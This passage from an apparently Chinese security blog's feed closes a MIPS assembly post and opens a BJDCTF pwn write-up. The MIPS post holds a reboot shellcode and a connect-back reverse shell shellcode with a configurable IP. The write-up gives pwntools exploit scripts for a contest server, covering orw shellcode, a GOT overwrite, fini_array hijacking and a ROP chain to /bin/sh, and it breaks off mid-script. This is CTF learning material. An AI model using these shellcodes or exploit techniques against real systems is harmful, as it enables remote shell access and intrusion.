class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - reboot() - 32 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =          </span><br><span class="line">         <span class="string">"\x3c\x06\x43\x21"</span>       <span class="comment">// lui     a2,0x4321</span></span><br><span class="line">         <span class="string">"\x34\xc6\xfe\xdc"</span>       <span class="comment">// ori     a2,a2,0xfedc</span></span><br><span class="line">         <span class="string">"\x3c\x05\x28\x12"</span>       <span class="comment">// lui     a1,0x2812</span></span><br><span class="line">         <span class="string">"\x34\xa5\x19\x69"</span>       <span class="comment">// ori     a1,a1,0x1969</span></span><br><span class="line">         <span class="string">"\x3c\x04\xfe\xe1"</span>       <span class="comment">// lui     a0,0xfee1</span></span><br><span class="line">         <span class="string">"\x34\x84\xde\xad"</span>       <span class="comment">// ori     a0,a0,0xdead</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xf8"</span>       <span class="comment">// li      v0,4088</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;      <span class="comment">// syscall 0x40404 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x20\x27"</span>        <span class="comment">// nor     a0,t7,zero</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x57"</span>        <span class="comment">// li      v0,4183 ( sys_socket )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\xaf\xa2\xff\xff"</span>        <span class="comment">// sw      v0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3 ( sa_family = AF_INET )</span></span><br><span class="line">         <span class="string">"\x01\xe0\x78\x27"</span>        <span class="comment">// nor     t7,t7,zero</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xe0"</span>        <span class="comment">// sw      t7,-32(sp) </span></span><br><span class="line">         <span class="string">"\x3c\x0e\x7a\x69"</span>        <span class="comment">// lui     t6,0x7a69 ( sin_port = 0x7a69 )</span></span><br><span class="line">         <span class="string">"\x35\xce\x7a\x69"</span>        <span class="comment">// ori     t6,t6,0x7a69</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xe4"</span>        <span class="comment">// sw      t6,-28(sp)</span></span><br><span class="line">         </span><br><span class="line">      <span class="comment">/* ====================  You can change ip here ;) ====================== */</span></span><br><span class="line">         <span class="string">"\x3c\x0d\xc0\xa8"</span>        <span class="comment">// lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... </span></span><br><span class="line">         <span class="string">"\x35\xad\x01\x64"</span>        <span class="comment">// ori     t5,t5,0x164           ...0164 )</span></span><br><span class="line">      <span class="comment">/* ====================================================================== */</span></span><br><span class="line">      </span><br><span class="line">         <span class="string">"\xaf\xad\xff\xe6"</span>        <span class="comment">// sw      t5,-26(sp)</span></span><br><span class="line">         <span class="string">"\x23\xa5\xff\xe2"</span>        <span class="comment">// addi    a1,sp,-30</span></span><br><span class="line">         <span class="string">"\x24\x0c\xff\xef"</span>        <span class="comment">// li      t4,-17 ( addrlen = 16 )     </span></span><br><span class="line">         <span class="string">"\x01\x80\x30\x27"</span>        <span class="comment">// nor     a2,t4,zero </span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x4a"</span>        <span class="comment">// li      v0,4170 ( sys_connect ) </span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line"><span class="comment">//dup2_loop:</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xdf"</span>        <span class="comment">// li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line">         <span class="string">"\x20\xa5\xff\xff"</span>        <span class="comment">// addi    a1,a1,-1</span></span><br><span class="line">         <span class="string">"\x24\x01\xff\xff"</span>        <span class="comment">// li      at,-1</span></span><br><span class="line">         <span class="string">"\x14\xa1\xff\xfb"</span>        <span class="comment">// bne     a1,at, dup2_loop</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">// lui     t7,0x2f2f</span></span><br><span class="line">         <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">// ori     t7,t7,0x6269</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">// sw      t7,-12(sp)</span></span><br><span class="line">         <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">// lui     t6,0x6e2f</span></span><br><span class="line">         <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">// ori     t6,t6,0x7368</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">// sw      t6,-8(sp)</span></span><br><span class="line">         <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">// sw      zero,-4(sp)</span></span><br><span class="line">         <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">// addiu   a0,sp,-12</span></span><br><span class="line">         <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">// slti    a1,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">// li      v0,4011 ( sys_execve )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;       <span class="comment">// syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reference：</p><p><a href="http://edu.i-soft.com.cn/doc/longxin-2017/02-1MIPS指令与汇编.pdf" target="_blank" rel="noopener">MIPS指令与汇编.pdf</a></p><p><a href="https://blog.csdn.net/u012837895/article/details/79855896" target="_blank" rel="noopener">MIPS汇编快速入门</a></p><p><a href="https://n132.github.io/2020/04/10/mips-Assembly-Language/" target="_blank" rel="noopener">mips_Assembly_Language</a></p><p><a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是&lt;code&gt;mips&lt;/code&gt;架构的，像&lt;code&gt;TP-Link&lt;/code&gt;
      
    
    </summary>
    
      <category term="mips" scheme="https://nocbtm.github.io/categories/mips/"/>
    
    
      <category term="mips" scheme="https://nocbtm.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:56:16.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span 